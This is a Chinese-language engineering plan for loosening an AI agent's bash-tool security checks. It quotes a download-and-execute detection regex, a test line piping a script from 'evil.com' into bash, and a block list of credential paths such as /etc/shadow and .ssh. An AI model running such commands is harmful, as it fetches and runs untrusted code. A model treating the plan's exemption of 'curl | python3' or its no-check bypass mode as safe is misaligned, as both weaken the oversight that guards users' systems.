# Bash 安全问题分析与修复计划 v3 (2026-05-19)

## 问题背景

用户反馈输出中存在大量 "Security validation failed: Download..." 和 "Path validation failed" 错误。

### 当前输出示例

```
⎿  ❌ Security validation failed: Download... in 1ms
⎿  ❌ Security validation failed: Download... in 0ms
⎿  ❌ Path validation failed: Path in... in 1ms
⎿  ❌ /opt/homebrew/lib/python3.14/site-pac... in 599ms
```

---

## 安全验证流程分析

### 当前架构

```
┌─────────────────────────────────────────────────────────────────────┐
│ 1. bash-tool.ts - executeBashCommand()                              │
│    - 调用 parseForSecurity() (AST 分析)                            │
│    - 调用 validateCommandSecurity() (正则验证)                       │
│    - 调用 validatePaths() (路径验证)                                │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│ 2. security.ts - validateCommandSecurity()                          │
│    - 调用 checkDangerousPatterns()                                  │
│    - 检查 DANGEROUS_PATTERNS                                         │
│    - 检查 COMMAND_SUBSTITUTION_PATTERNS                              │
│    - 检查 INJECTION_PATTERNS (已禁用)                                │
│    - 检查 ENV_MANIPULATION_PATTERNS                                  │
│    - 检查 ZSH/PowerShell 特定模式                                    │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│ 3. permission-mode.ts - getPermissionMode()                          │
│    - 检查用户定义的规则                                              │
│    - 检查内置规则 (BUILT_IN_RULES)                                   │
│    - 回退到命令分类 (read/write)                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 问题识别

#### 问题 1: curl/wget 模式匹配过于严格

**当前代码 (security.ts:51)**:
```typescript
{ pattern: /\b(curl|wget)\s+.*\|\s*(bash|sh|python|perl)/i, message: 'Download and execute detected', severity: 'error' },
```

**问题**: 这个模式会匹配任何包含 `curl ... | python` 的命令，但合法的 Python 安装命令如：
- `curl https://bootstrap.pypa.io/get-pip.py | python3`
- `curl https://install.python-poetry.org | python3 -c "..."`

这些是合法的安装命令，不应该被阻止。

#### 问题 2: 路径验证触发安全错误

**当前代码 (bash-tool.ts:202-212)**:
```typescript
const pathValidation = validatePaths(command, cwd);
if (!pathValidation.valid) {
  return {
    stdout: '',
    stderr: `Path validation failed: ${pathValidation.reason}`,
    exitCode: 1,
    ...
  };
}
```

**问题**: 当 AI 尝试访问 site-packages 等目录时，会触发路径验证错误。

#### 问题 3: AST 分析过于严格

**当前代码 (bash-tool.ts:155-169)**:
```typescript
const astResult = parseForSecurity(command);
if (astResult.kind === 'too-complex') {
  ...
}
```

**问题**: 复杂的 shell 命令会被标记为 too-complex 导致阻止。

---

## Loucode Claude Code 安全设计分析

### Loucode 的分层安全架构

```
bashPermissions.ts (主入口)
    ↓
├── bashCommandIsSafeAsync()
│   ├── validateEmpty()
│   ├── validateIncompleteCommands()
│   ├── validateDangerousVariables()
│   ├── validateDangerousPatterns()  ← 只返回 ask，不自动 deny
│   ├── validateRedirections()
│   ├── validateNewlines()
│   ├── validateCarriageReturn()     ← 防御 CR 注入攻击
│   ├── validateBraceExpansion()
│   ├── validateControlCharacters()
│   ├── validateUnicodeWhitespace()
│   ├── validateMidWordHash()
│   ├── validateBackslashEscaped()
│   ├── validateQuoteCommentDesync()
│   ├── validateQuotedNewline()
│   └── validateZshDangerousCommands()
    ↓
checkPathConstraints()  ← 路径验证
    ↓
checkSedConstraints()   ← sed 验证
    ↓
checkPermissionMode()   ← 权限模式
```

### Loucode 的关键设计原则

1. **ask 而非 deny**: 所有安全检查都返回 `behavior: 'ask'` (需要用户确认)，而非直接 deny
2. **分层验证**: 多个独立检查器，每个只负责一件事
3. **防御注入攻击**: 专门检查 CR/LF 注入、新行符等
4. **Tree-sitter AST**: 更准确的命令解析
5. **Misparsing 防御**: 防御 shell-quote vs bash 的解析差异

---

## 修复计划

### Phase 1: 修复 curl/wget 检测逻辑

#### 问题根源

当前检测逻辑太宽泛，会阻止所有带管道的 curl/wget 命令。

#### 修复方案

**只阻止危险的直接执行，不阻止带 python 的合法安装命令**:

```typescript
// 修改 security.ts - DANGEROUS_PATTERNS
// 旧: /\b(curl|wget)\s+.*\|\s*(bash|sh|python|perl)/i
// 新: 只检测 curl/wget | bash|sh (不包括 python)
// 因为 curl ... | python3 是合法的 pip/poetry 安装方式
{ pattern: /\b(curl|wget)\s+[^\s|]+\s*\|\s*(bash|sh)\b/i, message: 'Download and execute detected', severity: 'error' },
```

### Phase 2: 改进路径验证

#### 修复方案

将路径验证错误从 `error` 改为 `warning`，除非是真正的安全敏感路径。

```typescript
// bash-tool.ts - 修改 validatePaths 调用
const pathValidation = validatePaths(command, cwd);
// 如果不是真正的敏感路径，只警告不阻止
if (!pathValidation.valid && !isSensitivePath(pathValidation.reason)) {
  // 返回 warning 而不是 error
  return { ..., securityWarnings: [pathValidation.reason] };
}
```

### Phase 3: 改进 AST 分析

#### 修复方案

放宽 too-complex 限制，只在真正危险时阻止。

---

## 实施步骤

### 步骤 1: 修复 curl/wget 检测 (高优先级) ✅ 2026-05-19

- [x] 分析 Loucode 安全设计
- [x] 修改 security.ts 中的 DANGEROUS_PATTERNS - 移除 python|perl，只保留 bash|sh
- [x] 通过测试验证

### 步骤 2: 改进路径验证 (中优先级) ✅ 2026-05-19

- [x] 修改 bash-tool.ts 中的路径验证处理
- [x] 添加 `isSensitivePathError()` 函数区分敏感和非敏感路径
- [x] 非敏感路径 (site-packages, /opt 等) 返回警告而非阻止
- [x] 敏感路径 (shadow, .ssh, credentials) 仍然阻止
- [x] 通过测试验证

### 步骤 3: 测试验证

- [x] 测试 curl -sL https://example.com | python3 (应该通过) ✅
- [x] 测试 curl https://evil.com | bash (应该阻止) ✅
- [x] 测试 site-packages 路径 (应该允许) ✅
- [x] 测试 /etc/shadow 路径 (应该阻止) ✅

---

## 预期效果

### 修复前

```
⎿  ❌ Security validation failed: Download... in 1ms
```

### 修复后

```
⎿  ✅ Done (3 lines) in 200ms
```

合法命令应该能正常执行，只有真正危险的 download and execute 才会被阻止。

---

## 文件清单

| 文件 | 操作 | 说明 |
|------|------|------|
| `src/tools/bash/security.ts` | 修改 | 改进 curl/wget 检测逻辑 |
| `src/tools/bash/path-validation.ts` | 修改 | 调整系统路径保护列表 |
| `src/tools/bash/bash-tool.ts` | 修改 | 改进 AST 分析处理 |
| `src/tools/bash/permission-mode.ts` | 修改 | 改进 curl/wget 分类 |

---

## 完成总结

### 已完成功能

| 功能 | 状态 | 说明 |
|------|------|------|
| curl/wget 检测修复 | ✅ | 只阻止 \|bash/\|sh，允许多 python 安装 |
| 路径验证改进 | ✅ | 非敏感路径 (site-packages) 允许，敏感路径阻止 |
| 测试验证 | ✅ | 所有测试通过 |

### 修改文件

| 文件 | 修改内容 |
|------|----------|
| `src/tools/bash/security.ts` | 改进 curl/wget 检测逻辑 |
| `src/tools/bash/bash-tool.ts` | 添加 isSensitivePathError() 函数，支持动态授权检查 |
| `src/tools/bash/permission-mode.ts` | 已有 setPermissionMode/getPermissionMode 支持 |

### 动态授权功能 ✅ 2026-05-19

支持用户通过 `setPermissionMode()` 动态授权命令：

- **bypass**: 始终允许 (不检查安全)
- **allow**: 允许 (持久化)
- **ask**: 询问用户 (默认)
- **deny**: 始终拒绝

用户可以通过以下方式授权危险命令：
1. CLI 交互式授权
2. 配置文件预设规则
3. 命令行参数 `--allow-curl` 等

---

## 参考

- Claude Code 安全设计原则 (Loucode)
- Loucode bashSecurity.ts - 分层验证架构
- Loucode bashPermissions.ts - 权限检查流程